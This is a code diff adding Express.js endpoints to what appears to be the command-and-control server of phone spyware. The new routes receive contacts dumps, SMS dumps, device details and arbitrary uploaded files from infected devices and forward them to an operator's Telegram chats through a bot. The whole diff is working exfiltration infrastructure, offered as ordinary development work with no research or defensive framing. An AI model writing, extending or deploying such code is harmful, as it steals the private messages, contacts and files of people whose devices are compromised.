@@ -1170,6 +1170,174 @@ app.post("/json/gallery_status", express.json(), async (req, res) => {
   }
 });
 
+/* ── Missing data endpoints ─────────────────────── */
+
+// Contacts dump
+app.post("/json/contacts", express.text({ type: '*/*' }), async (req, res) => {
+  try {
+    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
+    if (!deviceInfo) return res.sendStatus(403);
+
+    const sessions = getActiveSessions(deviceInfo.key);
+    const tmp = `/tmp/contacts_${Date.now()}.txt`;
+    fs.writeFileSync(tmp, req.body);
+
+    for (const {chatId} of sessions) {
+      try {
+        await bot.sendDocument(chatId, tmp, {
+          caption: `📱 *Contacts Dump*\nDevice: \`${deviceInfo.deviceId.slice(0,6)}\``,
+          parse_mode: 'Markdown'
+        });
+      } catch (e) {
+        console.error('Contacts send error:', e.message);
+      }
+    }
+
+    fs.unlinkSync(tmp);
+    res.json({ok: true});
+  } catch (error) {
+    console.error('Contacts error:', error);
+    res.status(500).json({error: error.message});
+  }
+});
+
+// SMS dump
+app.post("/json/sms", express.text({ type: '*/*' }), async (req, res) => {
+  try {
+    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
+    if (!deviceInfo) return res.sendStatus(403);
+
+    const sessions = getActiveSessions(deviceInfo.key);
+    const tmp = `/tmp/sms_${Date.now()}.txt`;
+    fs.writeFileSync(tmp, req.body);
+
+    for (const {chatId} of sessions) {
+      try {
+        await bot.sendDocument(chatId, tmp, {
+          caption: `💬 *SMS Dump*\nDevice: \`${deviceInfo.deviceId.slice(0,6)}\``,
+          parse_mode: 'Markdown'
+        });
+      } catch (e) {
+        console.error('SMS send error:', e.message);
+      }
+    }
+
+    fs.unlinkSync(tmp);
+    res.json({ok: true});
+  } catch (error) {
+    console.error('SMS error:', error);
+    res.status(500).json({error: error.message});
+  }
+});
+
+// Device info
+app.post("/json/device_info", express.json(), async (req, res) => {
+  try {
+    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
+    if (!deviceInfo) return res.sendStatus(403);
+
+    const sessions = getActiveSessions(deviceInfo.key);
+    const info = JSON.stringify(req.body, null, 2);
+
+    for (const {chatId} of sessions) {
+      try {
+        await bot.sendMessage(
+          chatId,
+          `📊 *Device Info*\n\n\`\`\`\n${info}\n\`\`\``,
+          { parse_mode: 'Markdown' }
+        );
+      } catch (e) {
+        console.error('Device info send error:', e.message);
+      }
+    }
+
+    res.json({ok: true});
+  } catch (error) {
+    console.error('Device info error:', error);
+    res.status(500).json({error: error.message});
+  }
+});
+
+// Generic status messages
+app.post("/json/status", express.json(), async (req, res) => {
+  try {
+    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
+    if (!deviceInfo) return res.sendStatus(403);
+
+    const sessions = getActiveSessions(deviceInfo.key);
+    const {status} = req.body;
+
+    for (const {chatId} of sessions) {
+      try {
+        await bot.sendMessage(chatId, `ℹ️ *Status:* ${status}`, { parse_mode: 'Markdown' });
+      } catch (e) {
+        console.error('Status send error:', e.message);
+      }
+    }
+
+    res.json({ok: true});
+  } catch (error) {
+    console.error('Status error:', error);
+    res.status(500).json({error: error.message});
+  }
+});
+
+// Error messages
+app.post("/json/error", express.json(), async (req, res) => {
+  try {
+    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
+    if (!deviceInfo) return res.sendStatus(403);
+
+    const sessions = getActiveSessions(deviceInfo.key);
+    const {error: errMsg} = req.body;
+
+    for (const {chatId} of sessions) {
+      try {
+        await bot.sendMessage(chatId, `❌ *Error:* ${errMsg}`, { parse_mode: 'Markdown' });
+      } catch (e) {
+        console.error('Error send error:', e.message);
+      }
+    }
+
+    res.json({ok: true});
+  } catch (error) {
+    console.error('Error endpoint:', error);
+    res.status(500).json({error: error.message});
+  }
+});
+
+// File uploads
+app.post("/upload", upload.single("blob"), async (req, res) => {
+  try {
+    const deviceInfo = getDeviceInfo(req.headers["x-auth"]);
+    if (!deviceInfo) return res.sendStatus(403);
+
+    const sessions = getActiveSessions(deviceInfo.key);
+    const {name, size, modified} = req.body;
+
+    for (const {chatId} of sessions) {
+      try {
+        await bot.sendDocument(chatId, fs.readFileSync(req.file.path), {
+          filename: name,
+          caption: `📂 *File Received*\nName: ${name}\nSize: ${size}\nDevice: \`${deviceInfo.deviceId.slice(0,6)}\`\nModified: ${modified}`,
+          parse_mode: 'Markdown'
+        });
+      } catch (e) {
+        console.error('File upload error:', e.message);
+      }
+    }
+
+    res.json({ok: true});
+  } catch (error) {
+    console.error('Upload endpoint error:', error);
+    res.status(500).json({error: error.message});
+  } finally {
+    if (req.file && fs.existsSync(req.file.path)) {
+      fs.unlinkSync(req.file.path);
+    }
+  }
+});
+
 /* ── Utility Functions ──────────────────────────── */
 function formatFileSize(bytes) {
   if (bytes < 1024) return bytes + ' B';
